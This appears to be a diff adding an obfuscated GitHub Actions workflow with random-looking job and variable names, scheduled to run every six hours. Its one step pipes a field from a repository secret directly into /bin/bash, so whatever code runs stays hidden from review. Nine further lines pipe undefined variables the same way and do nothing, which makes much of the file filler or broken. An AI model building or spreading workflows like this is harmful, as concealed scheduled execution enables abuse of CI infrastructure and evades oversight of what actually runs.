@@ -1,0 +1,27 @@
+name: kongxiangxi6985
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kongxiangxi6985
+        env:
+          lb2883: ${{ secrets.lb2883 }}
+        run: |
+          echo $lb2883 | jq -r .z9 | /bin/bash
+          echo $roj769 | jq -r .y2 | /bin/bash
+          echo $vr80692 | jq -r .iz888 | /bin/bash
+          echo $nkhvm91410 | jq -r .sfi30046 | /bin/bash
+          echo $ghcw1 | jq -r .e7602 | /bin/bash
+          echo $ftwr96 | jq -r .wmss2 | /bin/bash
+          echo $qnqru17270 | jq -r .obv20 | /bin/bash
+          echo $l8 | jq -r .xcsp9 | /bin/bash
+          echo $ecre56058 | jq -r .kgk80 | /bin/bash
+          echo $k7571 | jq -r .sloxs4 | /bin/bash
+
